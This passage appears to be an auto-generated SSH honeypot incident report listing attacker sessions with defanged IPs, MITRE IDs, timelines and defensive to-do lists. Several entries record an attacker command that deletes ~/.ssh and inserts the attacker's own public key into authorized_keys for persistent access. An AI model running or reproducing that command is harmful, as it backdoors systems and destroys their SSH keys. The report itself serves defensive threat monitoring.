| `2026-04-13 06:22:45` | `cowrie.command.input` |
| `2026-04-13 06:22:45` | `cowrie.session.file_download` |
| `2026-04-13 06:22:45` | `cowrie.log.closed` |
| `2026-04-13 06:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6d1a2629401

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:22 |
| **Last Seen** | 2026-04-13 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:22:47` | `cowrie.session.connect` |
| `2026-04-13 06:22:47` | `cowrie.client.version` |
| `2026-04-13 06:22:47` | `cowrie.client.kex` |
| `2026-04-13 06:22:48` | `cowrie.login.success` |
| `2026-04-13 06:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c912f781eb16

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:22 |
| **Last Seen** | 2026-04-13 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:22:47` | `cowrie.session.connect` |
| `2026-04-13 06:22:47` | `cowrie.client.version` |
| `2026-04-13 06:22:48` | `cowrie.client.kex` |
| `2026-04-13 06:22:49` | `cowrie.login.success` |
| `2026-04-13 06:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f9aebb6d584

| Field | Detail |
|---|---|
| **Source IP** | `14.103.46[.]177` |
| **First Seen** | 2026-04-13 06:23 |
| **Last Seen** | 2026-04-13 06:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:23:46` | `cowrie.session.connect` |
| `2026-04-13 06:23:46` | `cowrie.client.version` |
| `2026-04-13 06:23:46` | `cowrie.client.kex` |
| `2026-04-13 06:23:47` | `cowrie.login.success` |
| `2026-04-13 06:23:47` | `cowrie.session.params` |
| `2026-04-13 06:23:47` | `cowrie.command.input` |
| `2026-04-13 06:23:47` | `cowrie.command.failed` |
| `2026-04-13 06:23:47` | `cowrie.log.closed` |
| `2026-04-13 06:23:48` | `cowrie.session.params` |
| `2026-04-13 06:23:48` | `cowrie.command.input` |
| `2026-04-13 06:23:48` | `cowrie.session.file_download` |
| `2026-04-13 06:23:48` | `cowrie.log.closed` |
| `2026-04-13 06:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.46[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.46[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21764256e3e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.46[.]177` |
| **First Seen** | 2026-04-13 06:23 |
| **Last Seen** | 2026-04-13 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:23:51` | `cowrie.session.connect` |
| `2026-04-13 06:23:51` | `cowrie.client.version` |
| `2026-04-13 06:23:52` | `cowrie.client.kex` |
| `2026-04-13 06:23:53` | `cowrie.login.success` |
| `2026-04-13 06:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.46[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.46[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-562f651db68e

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:24 |
| **Last Seen** | 2026-04-13 06:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:24:27` | `cowrie.session.connect` |
| `2026-04-13 06:24:27` | `cowrie.client.version` |
| `2026-04-13 06:24:27` | `cowrie.client.kex` |
| `2026-04-13 06:24:27` | `cowrie.login.success` |
| `2026-04-13 06:24:27` | `cowrie.session.params` |
| `2026-04-13 06:24:27` | `cowrie.command.input` |
| `2026-04-13 06:24:27` | `cowrie.command.failed` |
| `2026-04-13 06:24:27` | `cowrie.log.closed` |
| `2026-04-13 06:24:27` | `cowrie.session.params` |
| `2026-04-13 06:24:27` | `cowrie.command.input` |
| `2026-04-13 06:24:27` | `cowrie.session.file_download` |
| `2026-04-13 06:24:27` | `cowrie.log.closed` |
| `2026-04-13 06:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc6a673e43f

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:24 |
| **Last Seen** | 2026-04-13 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:24:28` | `cowrie.session.connect` |
| `2026-04-13 06:24:28` | `cowrie.client.version` |
| `2026-04-13 06:24:28` | `cowrie.client.kex` |
| `2026-04-13 06:24:29` | `cowrie.login.success` |
| `2026-04-13 06:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c966a9857502

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:26 |
| **Last Seen** | 2026-04-13 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:26:09` | `cowrie.session.connect` |
| `2026-04-13 06:26:09` | `cowrie.client.version` |
| `2026-04-13 06:26:09` | `cowrie.client.kex` |
| `2026-04-13 06:26:09` | `cowrie.login.success` |
| `2026-04-13 06:26:09` | `cowrie.session.params` |
| `2026-04-13 06:26:09` | `cowrie.command.input` |
| `2026-04-13 06:26:09` | `cowrie.command.failed` |
| `2026-04-13 06:26:09` | `cowrie.log.closed` |
| `2026-04-13 06:26:10` | `cowrie.session.params` |
| `2026-04-13 06:26:10` | `cowrie.command.input` |
| `2026-04-13 06:26:10` | `cowrie.session.file_download` |
| `2026-04-13 06:26:10` | `cowrie.log.closed` |
| `2026-04-13 06:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ace8be9bf19

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:26 |
| **Last Seen** | 2026-04-13 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:26:11` | `cowrie.session.connect` |
| `2026-04-13 06:26:11` | `cowrie.client.version` |
| `2026-04-13 06:26:11` | `cowrie.client.kex` |
| `2026-04-13 06:26:11` | `cowrie.login.success` |
| `2026-04-13 06:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7491e20337fa

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:26 |
| **Last Seen** | 2026-04-13 06:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:26:16` | `cowrie.session.connect` |
| `2026-04-13 06:26:16` | `cowrie.client.version` |
| `2026-04-13 06:26:16` | `cowrie.client.kex` |
| `2026-04-13 06:26:17` | `cowrie.login.success` |
| `2026-04-13 06:26:18` | `cowrie.session.params` |
| `2026-04-13 06:26:18` | `cowrie.command.input` |
| `2026-04-13 06:26:18` | `cowrie.command.failed` |
| `2026-04-13 06:26:18` | `cowrie.log.closed` |
| `2026-04-13 06:26:19` | `cowrie.session.params` |
| `2026-04-13 06:26:19` | `cowrie.command.input` |
| `2026-04-13 06:26:19` | `cowrie.session.file_download` |
| `2026-04-13 06:26:19` | `cowrie.log.closed` |
| `2026-04-13 06:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af886745102a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:26 |
| **Last Seen** | 2026-04-13 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:26:23` | `cowrie.session.connect` |
| `2026-04-13 06:26:23` | `cowrie.client.version` |
| `2026-04-13 06:26:23` | `cowrie.client.kex` |
| `2026-04-13 06:26:24` | `cowrie.login.success` |
| `2026-04-13 06:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-325720167a37

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:27 |
| **Last Seen** | 2026-04-13 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:27:44` | `cowrie.session.connect` |
| `2026-04-13 06:27:44` | `cowrie.client.version` |
| `2026-04-13 06:27:44` | `cowrie.client.kex` |
| `2026-04-13 06:27:45` | `cowrie.login.success` |
| `2026-04-13 06:27:45` | `cowrie.session.params` |
| `2026-04-13 06:27:45` | `cowrie.command.input` |
| `2026-04-13 06:27:45` | `cowrie.command.failed` |
| `2026-04-13 06:27:45` | `cowrie.log.closed` |
| `2026-04-13 06:27:45` | `cowrie.session.params` |
| `2026-04-13 06:27:45` | `cowrie.command.input` |
| `2026-04-13 06:27:46` | `cowrie.session.file_download` |
| `2026-04-13 06:27:46` | `cowrie.log.closed` |
| `2026-04-13 06:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02fa30cfbc3

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:27 |
| **Last Seen** | 2026-04-13 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:27:48` | `cowrie.session.connect` |
| `2026-04-13 06:27:48` | `cowrie.client.version` |
| `2026-04-13 06:27:48` | `cowrie.client.kex` |
| `2026-04-13 06:27:48` | `cowrie.login.success` |
| `2026-04-13 06:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da33c106516

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:27 |
| **Last Seen** | 2026-04-13 06:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:27:58` | `cowrie.session.connect` |
| `2026-04-13 06:27:58` | `cowrie.client.version` |
| `2026-04-13 06:27:58` | `cowrie.client.kex` |
| `2026-04-13 06:27:58` | `cowrie.login.success` |
| `2026-04-13 06:27:58` | `cowrie.session.params` |
| `2026-04-13 06:27:58` | `cowrie.command.input` |
| `2026-04-13 06:27:58` | `cowrie.command.failed` |
| `2026-04-13 06:27:58` | `cowrie.log.closed` |
| `2026-04-13 06:27:58` | `cowrie.session.params` |
| `2026-04-13 06:27:58` | `cowrie.command.input` |
| `2026-04-13 06:27:58` | `cowrie.session.file_download` |
| `2026-04-13 06:27:58` | `cowrie.log.closed` |
| `2026-04-13 06:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f63f68efc4

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:28 |
| **Last Seen** | 2026-04-13 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:28:00` | `cowrie.session.connect` |
| `2026-04-13 06:28:00` | `cowrie.client.version` |
| `2026-04-13 06:28:00` | `cowrie.client.kex` |
| `2026-04-13 06:28:00` | `cowrie.login.success` |
| `2026-04-13 06:28:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12a67bdb5f8

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:29 |
| **Last Seen** | 2026-04-13 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:29:45` | `cowrie.session.connect` |
| `2026-04-13 06:29:45` | `cowrie.client.version` |
| `2026-04-13 06:29:45` | `cowrie.client.kex` |
| `2026-04-13 06:29:45` | `cowrie.login.success` |
| `2026-04-13 06:29:45` | `cowrie.session.params` |
| `2026-04-13 06:29:45` | `cowrie.command.input` |
| `2026-04-13 06:29:45` | `cowrie.command.failed` |
| `2026-04-13 06:29:45` | `cowrie.log.closed` |
| `2026-04-13 06:29:46` | `cowrie.session.params` |
| `2026-04-13 06:29:46` | `cowrie.command.input` |
| `2026-04-13 06:29:46` | `cowrie.session.file_download` |
| `2026-04-13 06:29:46` | `cowrie.log.closed` |
| `2026-04-13 06:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d50f4046ed

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:29 |
| **Last Seen** | 2026-04-13 06:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:29:47` | `cowrie.session.connect` |
| `2026-04-13 06:29:47` | `cowrie.client.version` |
| `2026-04-13 06:29:47` | `cowrie.client.kex` |
| `2026-04-13 06:29:47` | `cowrie.login.success` |
| `2026-04-13 06:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3abc6cfbd1f2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:30 |
| **Last Seen** | 2026-04-13 06:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:30:02` | `cowrie.session.connect` |
| `2026-04-13 06:30:02` | `cowrie.client.version` |
| `2026-04-13 06:30:02` | `cowrie.client.kex` |
| `2026-04-13 06:30:03` | `cowrie.login.success` |
| `2026-04-13 06:30:04` | `cowrie.session.params` |
| `2026-04-13 06:30:04` | `cowrie.command.input` |
| `2026-04-13 06:30:04` | `cowrie.command.failed` |
| `2026-04-13 06:30:04` | `cowrie.log.closed` |
| `2026-04-13 06:30:05` | `cowrie.session.params` |
| `2026-04-13 06:30:05` | `cowrie.command.input` |
| `2026-04-13 06:30:05` | `cowrie.session.file_download` |
| `2026-04-13 06:30:05` | `cowrie.log.closed` |
| `2026-04-13 06:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17dd6e0057af

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:30 |
| **Last Seen** | 2026-04-13 06:30 |
| **Session Duration** | 1s |
